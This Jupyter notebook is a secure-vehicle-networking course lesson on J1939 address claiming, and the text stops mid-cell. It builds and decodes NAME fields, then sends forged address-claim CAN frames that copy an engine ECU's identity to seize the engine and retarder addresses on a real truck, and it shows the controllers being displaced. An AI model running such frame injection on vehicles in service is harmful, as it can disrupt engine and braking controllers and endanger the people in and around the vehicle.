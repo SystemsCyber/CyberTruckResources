{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# <center> J1939 Address Claim\n",
    "## <center> SYSE 549: Secure Vehicle and Industrial Networking\n",
    "## <center><img src=\"https://www.engr.colostate.edu/~jdaily/Systems-EN-CSU-1-C357.svg\" width=\"400\" />\n",
    "### <center> Instructor: Dr. Jeremy Daily"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## J1939 Address Claim\n",
    "J1939 has use cases where systems that utilize J1939 are reconfigured frequently. These scenarios include adding and removing construction or agriculture implemements or otherwise altering the vehicle network. In these situations, there is a risk of two controller applications (CAs) using the same source address (SA). Since messaging in J1939 includes a peer-to-peer mode with a source and destination address, there needs to be a mechanism to claim an address.\n",
    "\n",
    "###  Technical Requirements \n",
    "SAE J1939-81 specifies some requirements:\n",
    "1. Controller Applications must be capable of providing its unique 64-bit NAME.\n",
    "2. CAs must claim an address before sending messages\n",
    "3. Unsuccessful address claims must be handled and reported to the network.\n",
    "4. A CA must follow the address claiming initialization.\n",
    "5. A CA must support network managment requirements, including responses to power interruptions. \n",
    "\n",
    "#### The 64-bit NAME\n",
    "SAE defines the following fields in a 64-bin NAME:\n",
    "\n",
    "* 1 Bit : Arbitrary Address Capable\n",
    "* 3 Bits: Industry Group (SAE)\n",
    "* 4 Bits: Vehicle Systems Instance\n",
    "* 7 Bits: Vehicle System (SAE)\n",
    "* 1 Bit : Reserved (SAE)\n",
    "* 8 Bits: Function (SAE)\n",
    "* 5 Bits: Function Instance\n",
    "* 3 Bits: ECU Instance\n",
    "* 11 Bits: Manufacturer Code (SAE)\n",
    "* 21 Bits: Identity\n",
    "\n",
    "Some of these fields are specified by SAE in the J1939-81 standard; others are specified by manufacturers. The details of these are as follows:\n",
    "1. Arbitrary Address Capable: Indicates if a CA can negotiate its address. If the bit is set, then it can negotiate. If the bit = 0, then it cannot, which means it will always want to keep its address.\n",
    "2. Industry Group: These bits refer to the particular industy, like on-highway, construction, marine, etc.\n",
    "3. Vehicle Systems Instance: a number for each instance on a vehicle system in case there are several networks (e.g. train cars).\n",
    "4. Vehicle System: These are associated with industry groups and specify what kind of vehicle we are discussing, like  a tractor or a trailer.\n",
    "5. Reserved: Specified to be zero.\n",
    "6. Function: This is a code that if it is between 128 and 255, it would be associated with a particular industry group. If it is between 0 and 127, then it is not associated with other parameters.\n",
    "7. ECU Instance: There may be multiple CAs of the same kind (i.e. multiple engines on a boat), so the intance distinguishes them. \n",
    "8. Manufacturer Code: This code is assigned by SAE to different manufacturers.\n",
    "9. Identity Number: The is like a serial number assigned by the manufacturer.\n",
    "\n",
    "\n",
    "The J1939DA_2020.xls spreadsheet (i.e. the Digital Annex) has tables for all the NAME fields."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "# We'll need to align bits and bytes so we need the struct library\n",
    "import struct"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### NAME Building\n",
    "Let's build a name for a secure gateway device. This device may act as a gateway for the vehicle J1939 network to a telematics device to communicate with a back office server. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_8 = 0b10010001\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x91'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Start with the first byte\n",
    "# 1 Bit : Arbitrary Address Capable = 1 (true)\n",
    "# 3 Bits: Industry Group (SAE) = 1 (on-highway equipment)\n",
    "# 4 Bits: Vehicle Systems Instance = 1 (the first instance)\n",
    "arbitrary_address_capable_mask = 0b10000000\n",
    "industry_group_mask = 0b01110000\n",
    "veh_sys_instance_mask = 0b00001111\n",
    "\n",
    "arbitrary_address_capable = 1\n",
    "industry_group = 1\n",
    "veh_sys_instance = 1\n",
    "\n",
    "# Construct byte 8 according to J1939-81\n",
    "NAME_8 = arbitrary_address_capable_mask & arbitrary_address_capable << 7\n",
    "NAME_8 |= industry_group_mask & industry_group << 4\n",
    "NAME_8 |= veh_sys_instance_mask & veh_sys_instance\n",
    "print(\"NAME_8 = 0b{:08b}\".format(NAME_8))\n",
    "NAME = struct.pack('B',NAME_8)\n",
    "NAME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "10000000\n",
      "01110000\n",
      "00001111\n"
     ]
    }
   ],
   "source": [
    "#masks show the coverage of bytes \n",
    "print(\"{:08b}\".format(arbitrary_address_capable_mask))\n",
    "print(\"{:08b}\".format(industry_group_mask))\n",
    "print(\"{:08b}\".format(veh_sys_instance_mask))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Vehicle Systems and Functions\n",
    "The description of the vehicle systems depends on in industry group. There are 6 industry groups as follows:\n",
    "\n",
    "| Industry Group ID | Industry Group Description |\n",
    "| :-: | :-- |\n",
    "| 0 | Global, applies to all |\n",
    "| 1 | On-Highway Equipment |\n",
    "| 2 | Agricultural and Forestry Equipment |\n",
    "| 3 | Construction Equipment |\n",
    "| 4 | Marine |\n",
    "| 5 | Industrial-Process Control-Stationary (Gen-Sets) |\n",
    "\n",
    "Based on the industry group, there are different systems. Many common systems are global and do not have a specific system. This means many NAME fields for the industrial group and system ID will be zero.\n",
    "\n",
    "| Industry Group ID | Vehicle System ID | Vehicle System Description|\n",
    "| :-: |  :-: |  :- |\n",
    "| 0 | 0\t | Non-specific System |\n",
    "| 1 | 0\t | Non-specific System |\n",
    "| 1 | 1\t | Tractor |\n",
    "| 1 | 2\t | Trailer |\n",
    "| 2 | 0\t | Non-specific System |\n",
    "| 2 | 1\t | Tractor |\n",
    "| 2 | 2\t | Tillage |\n",
    "| 2 | 3\t | Secondary Tillage |\n",
    "| 2 | 4\t | Planters/Seeders |\n",
    "| 2 | 5\t | Fertilizers |\n",
    "| 2 | 6\t | Sprayers |\n",
    "| 2 | 7\t | Harvesters |\n",
    "| 2 | 8\t | Root Harvesters |\n",
    "| 2 | 9\t | Forage |\n",
    "| 2 | 10 | \tIrrigation |\n",
    "| 2 | 11 | \tTransport/Trailer |\n",
    "| 2 | 12 | \tFarm Yard Operations |\n",
    "| 2 | 13 | \tPowered Auxiliary Devices |\n",
    "| 2 | 14 | \tSpecial Crops |\n",
    "| 2 | 15 | \tEarth Work |\n",
    "| 2 | 16 | \tSkidder |\n",
    "| 2 | 17 | \tSensor Systems |\n",
    "| 2 | 19 | \tTimber Harvesters |\n",
    "| 2 | 20 | \tForwarders |\n",
    "| 2 | 21 | \tTimber Loaders |\n",
    "| 2 | 22 | \tTimber Processing Machines |\n",
    "| 2 | 23 | \tMulchers |\n",
    "| 2 | 24 | \tUtility Vehicles |\n",
    "| 2 | 25 | \tSlurry/Manure Applicators |\n",
    "| 2 | 26 | \tFeeders/Mixers |\n",
    "| 2 | 27 | \tWeeders |\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_7 = 0b00000000\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x91\\x00'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's build Byte 7\n",
    "# 7 Bits: Vehicle System (SAE) \n",
    "# 1 Bit : Reserved (SAE) = 0\n",
    "vehicle_system_mask = 0b11111110\n",
    "vehicle_system = 0 #Global, Non-specific System\n",
    "NAME_7 = vehicle_system_mask & vehicle_system << 1\n",
    "print(\"NAME_7 = 0b{:08b}\".format(NAME_7))\n",
    "NAME += struct.pack('B',NAME_7)\n",
    "NAME"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### All Industry Group Inclusive NAME Functions \n",
    "There are lists in the J1939 Digital Annex that describes the different functions. The main list is the Global Name Functions, and the second is the Industry Group Specific Name Functions.\n",
    "\n",
    "Here is an example of a table entry in the global list\n",
    "\n",
    "Function ID: 28\n",
    "\n",
    "Function description: Off Vehicle Gateway\n",
    "\n",
    "Notes: ECU for connecting between vehicle network(s) and an off-vehicle system or network, such as fleet management. Connection may be wireless. Performs Gateway functions, i.e., filters messages, translates between protocols. \n",
    "\n",
    "### Industry Group and Vehicle System Dependent NAME Functions \n",
    "Vehicle System is a 7-bit field defined by SAE J1939-81. It is combined with the\n",
    "Industry Group to represent a common name. See J1939 (top-level document) Appendix B, Table\n",
    "B12. Vehicle System provides a common name for a group of functions within a connected network.\n",
    "Examples of Vehicle Systems for currently defined Industry Groups are \"tractor\" in the \"Common” Industry Group, “Trailer” in the On-Highway Industry Group, and planter in the \"Agricultural Equipment” Industry Group.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_6 = 0b00011100\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x91\\x00\\x1c'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's build Byte 6\n",
    "# 8 Bits: Function (SAE) \n",
    "\n",
    "vehicle_function_mask = 0xFF\n",
    "vehicle_function = 28 #Off Vehicle Gateway\n",
    "NAME_6 = (vehicle_function_mask & vehicle_function)\n",
    "print(\"NAME_6 = 0b{:08b}\".format(NAME_6))\n",
    "NAME += struct.pack('B',NAME_6)\n",
    "NAME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_5 = 0b00100001\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x91\\x00\\x1c!'"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# NAME Byte 5 has the following:\n",
    "# 5 Bits: Function Instance\n",
    "# 3 Bits: ECU Instance\n",
    "function_instance_mask = 0b00011111\n",
    "ecu_instance_mask = 0b11100000\n",
    "\n",
    "function_instance = 1\n",
    "ecu_instance = 1\n",
    "\n",
    "\n",
    "# Construct byte 8 according to J1939-81\n",
    "NAME_5 = ecu_instance_mask & ecu_instance << 5\n",
    "NAME_5 |= function_instance_mask & function_instance\n",
    "print(\"NAME_5 = 0b{:08b}\".format(NAME_5))\n",
    "NAME += struct.pack('B',NAME_5)\n",
    "NAME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ma_code = 0b00000000000000000000000000101101\n",
      "NAME_ID = 0b00000101101000011110001001000000\n",
      "NAME_ID = 0x05A1E240\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\x91\\x00\\x1c!\\x05\\xa1\\xe2@'"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now we can create a 32-bit work comprising the Manufacturer and their serial number.\n",
    "# 11 Bits: Manufacturer Code (SAE)\n",
    "# 21 Bits: Identity\n",
    "\n",
    "manufacturer_code = 45 #This is made up and doesn't have an entry in the table.\n",
    "manufacturer_code_mask = 0xFFE00000\n",
    "\n",
    "identity = 123456\n",
    "identity_mask = 0x001FFFFF\n",
    "\n",
    "NAME_ID = manufacturer_code_mask & manufacturer_code << 21\n",
    "NAME_ID |= identity_mask & identity \n",
    "\n",
    "print(\"ma_code = 0b{:032b}\".format(manufacturer_code)) \n",
    "print(\"NAME_ID = 0b{:032b}\".format(NAME_ID)) \n",
    "print(\"NAME_ID = 0x{:08X}\".format(NAME_ID)) \n",
    "NAME += struct.pack('>L',NAME_ID)\n",
    "NAME"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x91\\x00\\x1c!\\x05\\xa1\\xe2@'\n",
      "NAME_bytes = 91001C2105A1E240\n",
      "NAME_bits  = 1001000100000000000111000010000100000101101000011110001001000000\n"
     ]
    }
   ],
   "source": [
    "# Create a 64-bit NAME field\n",
    "NAME_bytes = struct.pack(\"4B\",NAME_8,NAME_7,NAME_6,NAME_5)\n",
    "NAME_bytes += struct.pack(\">L\", NAME_ID)\n",
    "print(NAME_bytes)\n",
    "name_int = struct.unpack(\">Q\",NAME_bytes)[0]\n",
    "print(\"NAME_bytes = {:08X}\".format(name_int))\n",
    "print(\"NAME_bits  = {:064b}\".format(name_int))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Preferred Address\n",
    "For a quick address claiming process, ECUs and CAs should have a preferred address. \n",
    "The following are some preferred addresses:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "source_address_dict = {}\n",
    "addresses = \"\"\"\n",
    "  0\tEngine #1\n",
    "  1\tEngine #2\n",
    "  2\tTurbocharger\n",
    "  3\tTransmission #1\n",
    "  4\tTransmission #2\n",
    "  5\tShift Console - Primary\n",
    "  6\tShift Console - Secondary\n",
    "  7\tPower TakeOff - (Main or Rear)\n",
    "  8\tAxle - Steering\n",
    "  9\tAxle - Drive #1\n",
    " 10\tAxle - Drive #2\n",
    " 11\tBrakes - System Controller\n",
    " 12\tBrakes - Steer Axle\n",
    " 13\tBrakes - Drive axle #1\n",
    " 14\tBrakes - Drive Axle #2\n",
    " 15\tRetarder - Engine\n",
    " 16\tRetarder - Driveline\n",
    " 17\tCruise Control\n",
    " 18\tFuel System\n",
    " 19\tSteering Controller\n",
    " 20\tSuspension - Steer Axle\n",
    " 21\tSuspension - Drive Axle #1\n",
    " 22\tSuspension - Drive Axle #2\n",
    " 23\tInstrument Cluster #1\n",
    " 24\tTrip Recorder\n",
    " 25\tPassenger-Operator Climate Control #1\n",
    " 26\tAlternator/Electrical Charging System\n",
    " 27\tAerodynamic Control\n",
    " 28\tVehicle Navigation\n",
    " 29\tVehicle Security\n",
    " 30\tElectrical System\n",
    " 31\tStarter System\n",
    " 32\tTractor-Trailer Bridge #1\n",
    " 33\tBody Controller\n",
    " 34\tAuxiliary Valve Control or Engine Air System Valve Control\n",
    " 35\tHitch Control\n",
    " 36\tPower TakeOff (Front or Secondary)\n",
    " 37\tOff Vehicle Gateway\n",
    " 38\tVirtual Terminal (in cab)\n",
    " 39\tManagement Computer #1\n",
    " 40\tCab Display #1\n",
    " 41\tRetarder, Exhaust, Engine #1\n",
    " 42\tHeadway Controller\n",
    " 43\tOn-Board Diagnostic Unit\n",
    " 44\tRetarder, Exhaust, Engine #2\n",
    " 45\tEndurance Braking System\n",
    " 46\tHydraulic Pump Controller\n",
    " 47\tSuspension - System Controller #1\n",
    " 48\tPneumatic - System Controller\n",
    " 49\tCab Controller - Primary\n",
    " 50\tCab Controller - Secondary\n",
    " 51\tTire Pressure Controller\n",
    " 52\tIgnition Control Module #1\n",
    " 53\tIgnition Control Module #2\n",
    " 54\tSeat Control #1\n",
    " 55\tLighting - Operator Controls\n",
    " 56\tRear Axle Steering Controller #1\n",
    " 57\tWater Pump Controller\n",
    " 58\tPassenger-Operator Climate Control #2\n",
    " 59\tTransmission Display - Primary\n",
    " 60\tTransmission Display - Secondary\n",
    " 61\tExhaust Emission Controller\n",
    " 62\tVehicle Dynamic Stability Controller\n",
    " 63\tOil Sensor\n",
    " 64\tSuspension - System Controller #2\n",
    " 65\tInformation System Controller #1\n",
    " 66\tRamp Control\n",
    " 67\tClutch/Converter Unit\n",
    " 68\tAuxiliary Heater #1\n",
    " 69\tAuxiliary Heater #2\n",
    " 70\tEngine Valve Controller\n",
    " 71\tChassis Controller #1\n",
    " 72\tChassis Controller #2\n",
    " 73\tPropulsion Battery Charger\n",
    " 74\tCommunications Unit, Cellular\n",
    " 75\tCommunications Unit, Satellite\n",
    " 76\tCommunications Unit, Radio\n",
    " 77\tSteering Column Unit\n",
    " 78\tFan Drive Controller\n",
    " 79\tSeat Control #2\n",
    " 80\tParking Brake Controller\n",
    " 81\tAftertreatment #1 system gas intake\n",
    " 82\tAftertreatment #1 system gas outlet\n",
    " 83\tSafety Restraint System\n",
    " 84\tCab Display #2\n",
    " 85\tDiesel Particulate Filter Controller\n",
    " 86\tAftertreatment #2 system gas intake\n",
    " 87\tAftertreatment #2 system gas outlet\n",
    " 88\tSafety Restraint System #2\n",
    " 89\tAtmospheric Sensor\n",
    " 90\tPowertrain Control Module\n",
    " 91\tPower Systems Manager\n",
    " 92\tEngine Injection Control Module\n",
    " 93\tFire Protection System\n",
    " 94\tDriver Impairment Device\n",
    " 128\tthru 247\tUsed for dynamic address assignment\n",
    " 248\tFile Server / Printer\n",
    " 249\tOff Board Diagnostic-Service Tool #1\n",
    " 250\tOff Board Diagnostic-Service Tool #2\n",
    " 251\tOn-Board Data Logger\n",
    " 254\tNull Address\n",
    " 255\tGLOBAL\n",
    "\"\"\"\n",
    "address_list = addresses.split(\"\\n\")\n",
    "for line  in address_list:\n",
    "    try:\n",
    "        entry = line.strip('* ').split('\\t')\n",
    "    except IndexError:\n",
    "        continue\n",
    "    #print(entry)\n",
    "    if len(entry) < 2:\n",
    "        continue\n",
    "   \n",
    "    sa = int(entry[0])\n",
    "    meaning = entry[1].strip()\n",
    "    source_address_dict[sa]=meaning\n",
    "\n",
    "with open('J1939SourceAddressDB.json','w') as fp:\n",
    "    json.dump(source_address_dict,fp, indent=4,sort_keys=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Serializing the Source Addresses\n",
    "The JSON format is great for storing the dictionary. However, it stores the keys as strings, not integers. Integer keys are faster during lookup, so the the prefered way is to use the dictionary with integer keys. This means we have to convert the string keys to integer keys. With a little help from the internet, we can use a quick recursive function to make the conversion when we load the JSON based file.\n",
    "\n",
    "https://stackoverflow.com/questions/17099556/why-do-int-keys-of-a-python-dict-turn-into-strings-when-using-json-dumps"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "# https://stackoverflow.com/questions/17099556/why-do-int-keys-of-a-python-dict-turn-into-strings-when-using-json-dumps\n",
    "def pythonify(json_data):\n",
    "\n",
    "    correctedDict = {}\n",
    "\n",
    "    for key, value in json_data.items():\n",
    "        if isinstance(value, list):\n",
    "            value = [pythonify(item) if isinstance(item, dict) else item for item in value]\n",
    "        elif isinstance(value, dict):\n",
    "            value = pythonify(value)\n",
    "        try:\n",
    "            key = int(key)\n",
    "        except Exception as ex:\n",
    "            pass\n",
    "        correctedDict[key] = value\n",
    "\n",
    "    return correctedDict"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0 Engine #1\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "int"
      ]
     },
     "execution_count": 14,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the JSON and convert the keys.\n",
    "with open('J1939SourceAddressDB.json','r') as fp:\n",
    "    #SAs = json.load(fp)\n",
    "    SAs = pythonify(json.load(fp))\n",
    "for k,v in SAs.items():\n",
    "    print(k,v)\n",
    "    break\n",
    "type(k)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Address Claim Procedure\n",
    "The following procedure was adapted from the book entitled \"SAE J1939 ECU Programming and Vehicle Bus Simulation\" by Wilfried Voss.\n",
    "\n",
    "In this diagram, the goal of the address claim procedure is to end up at the Normal Data Traffic process. However, there are scenarios where that doesn't happen. We will explore those.\n",
    "\n",
    "![AddressClaimProcedure.svg](AddressClaimProcedure.svg)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Looking for an Address Claim\n",
    "During startup of an ECU on J1939, an Address Claimed Message will often be broadcast. Here's an example.\n",
    "\n",
    "The following command was given from a Linux terminal \n",
    "```\n",
    "candump any | grep 18EE\n",
    "```\n",
    "That gives the following output\n",
    "```\n",
    "  can1  18EEFF00   [8]  06 03 BF 01 00 00 00 10\n",
    "  can1  18EEFF00   [8]  06 03 BF 01 00 00 00 10\n",
    "  can1  18EEFF00   [8]  06 03 BF 01 00 00 00 10\n",
    "```\n",
    "To interpret this message, we start with breaking down the ID. Let's break it into 4 parts: 18 EE FF 00\n",
    "\n",
    "* Priority: 6 (0x18 >> 2)\n",
    "* PGN: 0xEE00 = 60928 (Address Claim)\n",
    "* Destination Address: 0xFF = 255 (Global)\n",
    "* Source Address: 0x00 (Engine #1)\n",
    "\n",
    "Next, we decode the different bytes from the message, which makes up the NAME field.\n",
    "The following table shows the position and interpretation of the data in NAME according to J1939-81.\n",
    "\n",
    "| Byte | Bits | Description | Value |\n",
    "| --- | --- | --- | --- | \n",
    "| Byte 1 | Bits 8-1 | Least significant byte of Identity Number | 0x06 |\n",
    "| Byte 2 | Bits 8-1 | Second byte of Identity Number |0x03|\n",
    "| Byte 3 | Bits 8-6 | Least significant 3 bits of Manufacturer Code | 0xBF |\n",
    "| Byte 3 | Bits 5-1 | Most significant 5 bits of Identity Number | 0xBF  |\n",
    "| Byte 4 | Bits 8-1 | Most significant 8 bits of Manufacturer Code | 0x01 |\n",
    "| Byte 5 | Bits 8-4 | Function Instance | 0x00 |\n",
    "| Byte 5 | Bits 3-1 | ECU Instance | 0x00 |\n",
    "| Byte 6 | Bits 8-1 | Function  | 0x00 |\n",
    "| Byte 7 | Bits 8-2 | Vehicle System  | 0x00 |\n",
    "| Byte 7 | Bit 1 | Reserved | 0x00 |\n",
    "| Byte 8 | Bit 8 | Arbitrary Address Capable | 0x10 |\n",
    "| Byte 8 | Bits 7-5 | Industry Group | 0x10 |\n",
    "| Byte 8 | Bits 4-1 | Vehicle System Instance | 0x10 |\n",
    "\n",
    "Let's parse these a little better.\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'\\x06\\x03\\xbf\\x01\\x00\\x00\\x00\\x10'"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "name_bytes = bytes.fromhex('06 03 BF 01 00 00 00 10')\n",
    "#name_bytes = bytes.fromhex('00 00 60 01 00 81 00 00')\n",
    "name_bytes"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "arbitrary_address_capable = 0\n",
      "industry_group = 1\n",
      "veh_sys_instance = 0\n"
     ]
    }
   ],
   "source": [
    "NAME_8 = name_bytes[7]\n",
    "\n",
    "arbitrary_address_capable = (arbitrary_address_capable_mask & NAME_8 ) >> 7\n",
    "print('arbitrary_address_capable =', arbitrary_address_capable)\n",
    "\n",
    "industry_group = (industry_group_mask & NAME_8) >> 4\n",
    "print('industry_group =', industry_group)\n",
    "\n",
    "veh_sys_instance = (veh_sys_instance_mask & NAME_8)\n",
    "print('veh_sys_instance =', veh_sys_instance)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The industry group is 1, which is the On-Highway Equipment group.\n",
    "\n",
    "Bytes 7, 6 and 5 are all zeros, which indicates nonspecific vehicle system IDs, and the first instance of the Engine."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME_ID = 0b00000001101111110000001100000110\n",
      "manufacturer_code = 13\n",
      "serial_num =  2032390\n"
     ]
    }
   ],
   "source": [
    "NAME_ID = struct.unpack(\"<L\",name_bytes[0:4])[0]\n",
    "manufacturer_code = (manufacturer_code_mask & NAME_ID) >> 21\n",
    "print(\"NAME_ID = 0b{:032b}\".format(NAME_ID)) \n",
    "print('manufacturer_code =', manufacturer_code)\n",
    "\n",
    "serial_num = identity_mask & NAME_ID\n",
    "print('serial_num = ',serial_num)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The manufacture for 13 is Delco Electronics. The ECU we were connected to was made by Delphi, which used to be Delco."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Send an Address Claimed Message\n",
    "The J1939 address claimed message has a pgn of 60928 (0xEE00). \n",
    "\n",
    "Let's craft a message and send it out on the network. We'll try to claim source address 0, which is an engine controller."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "metadata": {},
   "outputs": [],
   "source": [
    "import socket\n",
    "import struct\n",
    "\n",
    "# Open a socket and bind to it from SocketCAN\n",
    "sock = socket.socket(socket.PF_CAN, socket.SOCK_RAW, socket.CAN_RAW)\n",
    "\n",
    "#Change this interface to match your desired connection\n",
    "interface = \"can1\"\n",
    "\n",
    "# Bind to the interface\n",
    "sock.bind((interface,))\n",
    "\n",
    "# To match the socketCAN data structure, the following struct format can be used:\n",
    "can_frame_format = \"<lB3x8s\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Script to make an address claim"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x00\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x06\\x03\\xbf\\x01\\x00\\x00\\x00\\x10'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "16"
      ]
     },
     "execution_count": 23,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's send the same message that we recieved from the engine controller to \n",
    "# see what happens\n",
    "can_id = 0x18EEFF00\n",
    "\n",
    "#Set the extended frame format bit.\n",
    "can_id |= socket.CAN_EFF_FLAG\n",
    "    \n",
    "can_data = name_bytes\n",
    "\n",
    "can_dlc = min(len(can_data),8)\n",
    "\n",
    "can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )\n",
    "print(can_packet)\n",
    "    \n",
    "#Send out the CAN frame\n",
    "sock.send(can_packet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "When this happens when connected to a Caterpillar, we can see the data:\n",
    "```\n",
    "  can1  18EEFF00   [8]  06 03 BF 01 00 00 00 10\n",
    "  can1  18EEFF80   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF80   [8]  D0 6B 01 01 00 00 00 80\n",
    "````\n",
    "Our message was the top message. The Caterpillar responded with a new address claimed: 0x80, which is the first address in line for dynamically allocated source addresses. \n",
    "\n",
    "Notice the NAME for the Caterpillar has the 8th bit in the 8th byte set, which means the Address is dynamically allocatable."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "arbitrary_address_capable = 1\n"
     ]
    }
   ],
   "source": [
    "arbitrary_address_capable = (arbitrary_address_capable_mask & 0x80 ) >> 7\n",
    "print('arbitrary_address_capable =', arbitrary_address_capable)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\x0f\\xff\\xee\\x98\\x08\\x00\\x00\\x00\\x06\\x03\\xbf\\x01\\x00\\x00\\x00\\x10'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "16"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Let's claim the the retarder address, 0x0F.\n",
    "can_id = 0x18EEFF0F\n",
    "\n",
    "#Set the extended frame format bit.\n",
    "can_id |= socket.CAN_EFF_FLAG\n",
    "    \n",
    "can_data = name_bytes\n",
    "\n",
    "can_dlc = min(len(can_data),8)\n",
    "\n",
    "can_packet = struct.pack(can_frame_format, can_id, can_dlc, can_data[:can_dlc] )\n",
    "print(can_packet)\n",
    "    \n",
    "#Send out the CAN frame\n",
    "sock.send(can_packet)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The response is\n",
    "```\n",
    "debian@beaglebone:~/TruckCapeProjects$ candump any |grep 18EE\n",
    "  can1  18EEFF0F   [8]  06 03 BF 01 00 00 00 10\n",
    "  can1  18EEFF81   [8]  01 02 03 01 00 0C 00 90\n",
    "  can1  18EEFF80   [8]  D0 6B 01 01 00 00 00 80\n",
    "  can1  18EEFF81   [8]  01 02 03 01 00 0C 00 90\n",
    "```\n",
    "which shows the the new addresses for the Cat engine controller application and retarder application."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'\\xfe\\xff\\xea\\x98\\x03\\x00\\x00\\x00\\x00\\xee\\x00\\x00\\x00\\x00\\x00\\x00'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "16"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Send a request message\n",
    "# 0x18 sets the priority to 6\n",
    "# 0xEA00 is the Request PGN\n",
    "# 0xFF is the global destination address. This could be for just the engine too (0x00)\n",
    "# 0xFE is the null address (used for devices without source addresses)\n",
    "can_id = 0x18EAFFFE\n",
    "\n",
    "#Set the extended frame format bit.\n",
    "can_id |= socket.CAN_EFF_FLAG\n",
    "  \n",
    "# Request the Address Claimed PGN\n",
